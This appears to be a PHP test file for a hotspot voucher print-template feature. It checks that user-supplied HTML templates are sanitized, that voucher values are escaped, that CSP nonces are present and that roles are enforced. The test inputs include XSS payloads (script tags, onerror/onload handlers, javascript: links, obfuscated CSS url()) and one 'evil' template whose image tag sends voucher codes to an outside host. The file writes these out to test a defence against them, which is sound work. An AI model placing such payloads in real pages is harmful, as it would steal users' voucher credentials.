<?php

namespace Tests\Feature;

use App\Models\PrintTemplate;
use App\Models\Router;
use App\Models\User;
use App\Models\Voucher;
use App\Models\VoucherBatch;
use App\Services\TemplateCetakService;
use App\Support\PembersihHtml;
use App\Support\TemplateCetakBawaan;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Hash;
use Tests\TestCase;

class TemplateCetakTest extends TestCase
{
    use RefreshDatabase;

    private function pengguna(string $role): User
    {
        return User::create([
            'name' => $role, 'username' => "{$role}uji", 'email' => "{$role}@example.test", 'password' => Hash::make('x'),
            'role' => $role, 'is_active' => true, 'two_factor_secret' => 'JBSWY3DPEHPK3PXP', 'two_factor_confirmed_at' => now(),
        ]);
    }

    private function batch(array $voucher, ?string $template = null): VoucherBatch
    {
        $r = Router::create(['slug' => 'div-a', 'name' => 'DIV-A', 'host' => '127.0.0.1', 'port' => 1, 'username' => 'x', 'password' => 'x', 'template_cetak' => $template]);
        $b = VoucherBatch::create([
            'router_id' => $r->id, 'router_name' => $r->name, 'code' => 'up-100-09.27.26-uji', 'profile' => '4-JAM',
            'quantity' => count($voucher), 'status' => 'success', 'validity' => '1d', 'price' => 5000, 'limit_uptime' => '4h',
        ]);
        foreach ($voucher as [$u, $p]) {
            Voucher::create(['batch_id' => $b->id, 'router_id' => $r->id, 'username' => $u, 'password' => $p, 'profile' => '4-JAM', 'comment' => $b->code, 'price' => 5000, 'limit_uptime' => '4h', 'status' => 'ready', 'sync_status' => 'success']);
        }

        return $b;
    }

    public function test_pembersih_membuang_script_event_url_luar_dan_css_berbahaya_tapi_menjaga_placeholder(): void
    {
        $p = new PembersihHtml();
        $hasil = $p->bersihkan(
            '<div id="printBtn" onclick="x()" style="color:red;background:url(https://luar/a.png)">{{kode}}</div>'
            . '<script>alert(1)</script><iframe src="https://luar"></iframe><form action="https://luar"><input name="a"></form>'
            . '<a href="javascript:alert(1)">a</a><a href="{{login_url}}">login</a><img src="https://luar/c?{{kode}}" onerror="x()">'
            . '<img src="data:image/png;base64,iVBORw0KGgo=" alt="logo"><table background="//luar/b.png"><tr><td style="width:u\72l(https://luar)">x</td></tr></table>'
            . '<svg onload="x()"></svg><style>@import url(https://luar/x.css); td{color:blue}</style>'
        );

        foreach (['<script', 'alert(', '<iframe', '<form', '<input', 'onclick', 'onerror', 'onload', 'https://luar', '//luar', 'javascript:', '<svg', '<style', 'id="printBtn"'] as $terlarang) {
            $this->assertStringNotContainsString($terlarang, $hasil, "masih ada {$terlarang}");
        }
        $this->assertStringContainsString('{{kode}}', $hasil);
        $this->assertStringContainsString('href="{{login_url}}"', $hasil);
        $this->assertStringContainsString('src="data:image/png;base64,iVBORw0KGgo="', $hasil);
        $this->assertStringContainsString('color:red', $hasil);
        $this->assertNotEmpty($p->dibuang());
        $this->assertStringNotContainsString('url(', PembersihHtml::bersihkanCss('background: u\72l(http://luar/x)'));
        $this->assertStringNotContainsString('luar', PembersihHtml::bersihkanCss('background-image: image-set("https://luar/x.png" 1x)'));
    }

    public function test_nilai_voucher_di_escape_dan_blok_vc_up_serta_kuota_dipilih_per_kartu(): void
    {
        $b  = $this->batch([['ab3k7', 'ab3k7'], ['<b>x</b>', '4821']]);
        $tp = '{{#vc}}<p class="vc">{{kode}}</p>{{/vc}}{{#up}}<p class="up">{{kode}}/{{password}}</p>{{/up}}{{#kuota}}<i>{{kuota}}</i>{{/kuota}}<s>{{batas_waktu}}|{{masa}}|{{harga}}|{{nomor}}</s>';

        $kartu = app(TemplateCetakService::class)->render($tp, $b->vouchers()->orderBy('id')->get(), $b)['kartu'];

        $this->assertSame('<p class="vc">ab3k7</p><s>4 jam|1 hari|Rp 5.000|1</s>', $kartu[0]);
        $this->assertSame('<p class="up">&lt;b&gt;x&lt;/b&gt;/4821</p><s>4 jam|1 hari|Rp 5.000|2</s>', $kartu[1]);
        $this->assertSame('1 hari 4 jam 30 menit', TemplateCetakService::durasi('1d4h30m'));
        $this->assertSame('', TemplateCetakService::durasi('0s'));
        $this->assertSame('1,5 GB', TemplateCetakService::kuota(1610612736));
    }

    public function test_template_mikhmon_bawaan_tercetak_seperti_di_mikhmon(): void
    {
        $b = $this->batch([['ab3k7', 'ab3k7'], ['5Kx7m2', '4821']]);

        $hasil = app(TemplateCetakService::class)->render(TemplateCetakBawaan::semua()['mikhmon-standar']['html'], $b->vouchers()->orderBy('id')->get(), $b);
        $teks  = array_map(fn ($k) => preg_replace('/\s+/', ' ', strip_tags(html_entity_decode($k))), $hasil['kartu']);

        $this->assertStringContainsString('table.voucher { display: inline-block; border: 2px solid black; margin: 2px; }', $hasil['gaya']);
        $this->assertStringContainsString('background-color: #ffcc00ff', $hasil['kartu'][0]);
        $this->assertStringContainsString('Login http://'.config('voucher.card.login').' [1]', $teks[0]);
        $this->assertStringContainsString('Kode Voucher ab3k7', $teks[0]);
        $this->assertStringContainsString('4 jam • Rp 5.000', $teks[0]);
        $this->assertStringNotContainsString('Masa berlaku', $teks[0]);
        $this->assertStringContainsString('Username Password 5Kx7m2 4821', $teks[1]);
        $this->assertStringContainsString('Masa berlaku: 1 hari', $teks[1]);
        $this->assertStringContainsString('[2]', $teks[1]);
    }

    public function test_halaman_cetak_memakai_default_router_dengan_csp_dan_semua_script_bernonce(): void
    {
        $jahat = PrintTemplate::create(['name' => 'Jahat', 'per_row' => 0, 'html' => '<div onmouseover="curi()">{{kode}}<img src="https://luar/?c={{kode}}"></div><script>curi()</script>']);
        $b = $this->batch([['ab3k7', 'ab3k7']], 't' . $jahat->id);
        $this->actingAs($this->pengguna('operator'));

        $res = $this->get(route('vouchers.print', $b))->assertOk();
        $csp = $res->headers->get('Content-Security-Policy');
        preg_match("/'nonce-([^']+)'/", $csp, $m);

        $this->assertStringContainsString("default-src 'none'", $csp);
        $this->assertStringContainsString("img-src 'self' data:", $csp);
        $html = $res->getContent();
        $this->assertStringContainsString('ab3k7', $html);
        $this->assertStringNotContainsString('curi()', $html);
        $this->assertStringNotContainsString('https://luar', $html);
        $this->assertSame(substr_count($html, '<script'), substr_count($html, '<script nonce="' . $m[1] . '"'));

        $this->get(route('vouchers.print', ['batch' => $b, 't' => 'v4']))->assertOk()->assertHeader('Content-Security-Policy');
    }

    public function test_operator_tidak_bisa_mengubah_template_dan_admin_dibatasi_validasi(): void
    {
        $tpl = PrintTemplate::create(['name' => 'A', 'per_row' => 4, 'html' => '<p>{{kode}}</p>']);

        $this->actingAs($this->pengguna('operator'));
        $this->postJson(route('voucher-templates.store'), ['name' => 'B', 'per_row' => 4, 'html' => '<p>x</p>'])->assertForbidden();
        $this->putJson(route('voucher-templates.update', $tpl), ['name' => 'B', 'per_row' => 4, 'html' => '<p>x</p>'])->assertForbidden();
        $this->postJson(route('voucher-templates.pratinjau'), ['per_row' => 4, 'html' => '<p>x</p>'])->assertForbidden();
        $this->get(route('voucher-templates.index'))->assertRedirect();

        $this->flushSession();
        $this->actingAs($this->pengguna('admin'));
        $this->postJson(route('voucher-templates.store'), ['name' => 'B', 'per_row' => 11, 'html' => '<p>x</p>'])->assertJsonValidationErrors('per_row');
        $this->postJson(route('voucher-templates.store'), ['name' => 'B', 'per_row' => 4, 'html' => str_repeat('a', 60001)])->assertJsonValidationErrors('html');
        $this->postJson(route('voucher-templates.store'), ['name' => 'B', 'per_row' => 4, 'html' => '<p onclick="x()">{{kode}} {{asal}}</p>'])
            ->assertOk()->assertJson(['dibuang' => ['atribut onclick'], 'asing' => ['asal']]);
    }

    public function test_template_default_router_tidak_bisa_dihapus_dan_bawaan_bisa_dikembalikan(): void
    {
        $tpl = PrintTemplate::where('bawaan', 'mikhmon-kecil')->firstOrFail();
        $this->batch([], 't' . $tpl->id);
        $this->actingAs($this->pengguna('admin'));

        $this->deleteJson(route('voucher-templates.destroy', $tpl))->assertStatus(422)->assertJsonPath('error', 'Masih jadi default DIV-A. Ganti default router itu dulu.');

        $tpl->update(['html' => '<p>rusak</p>']);
        $this->postJson(route('voucher-templates.pulihkan', $tpl))->assertOk();
        $this->assertStringContainsString('#25D366', $tpl->fresh()->html);

        $this->putJson(route('voucher-templates.default', 'div-a'), ['template' => 'v8'])->assertOk();
        $this->assertSame('v8', Router::where('slug', 'div-a')->value('template_cetak'));
        $this->putJson(route('voucher-templates.default', 'div-a'), ['template' => 't999'])->assertJsonValidationErrors('template');
        $this->get(route('voucher-templates.index'))->assertOk()->assertSee('{{kode}}', false)->assertSee('Kecil (hijau)')->assertDontSee('Mikhmon');

        $pratinjau = $this->postJson(route('voucher-templates.pratinjau'), ['per_row' => 0, 'html' => $tpl->fresh()->html . '<script>x()</script>'])
            ->assertOk()->assertJson(['success' => true, 'dibuang' => ['<script>'], 'asing' => []])->json('html');
        $this->assertStringContainsString('5Kx7m2', $pratinjau);
        $this->assertStringContainsString('#25D366', $pratinjau);
        $this->assertStringNotContainsString('x()', $pratinjau);
    }

    public function test_migrasi_label_lama_mengganti_nama_bawaan_dan_batch_tanpa_asal_lalu_bisa_dibalik(): void
    {
        $migrasi = require database_path('migrations/2026_09_28_000003_rename_legacy_labels.php');
        PrintTemplate::where('bawaan', 'mikhmon-standar')->update(['name' => 'Mikhmon standar (kuning)']);
        PrintTemplate::where('bawaan', 'mikhmon-kecil')->update(['name' => 'Kartu hijau saya']);
        $b = $this->batch([['5Kab12', '5Kab12']]);
        $b->update(['code' => 'mikhmon-tanpa-batch@div-a', 'label' => 'mikhmon-tanpa-batch']);
        $b->vouchers()->update(['comment' => 'mikhmon-tanpa-batch']);

        $migrasi->up();

        $this->assertSame('Standar (kuning)', PrintTemplate::where('bawaan', 'mikhmon-standar')->value('name'));
        $this->assertSame('Kartu hijau saya', PrintTemplate::where('bawaan', 'mikhmon-kecil')->value('name'));
        $this->assertSame(['tanpa-batch@div-a', 'tanpa-batch'], [$b->fresh()->code, $b->fresh()->label]);
        $this->assertSame(['tanpa-batch'], $b->vouchers()->pluck('comment')->all());

        $migrasi->down();

        $this->assertSame('Mikhmon standar (kuning)', PrintTemplate::where('bawaan', 'mikhmon-standar')->value('name'));
        $this->assertSame(['mikhmon-tanpa-batch@div-a', 'mikhmon-tanpa-batch'], [$b->fresh()->code, $b->fresh()->label]);
        $this->assertSame(['mikhmon-tanpa-batch'], $b->vouchers()->pluck('comment')->all());
    }
}
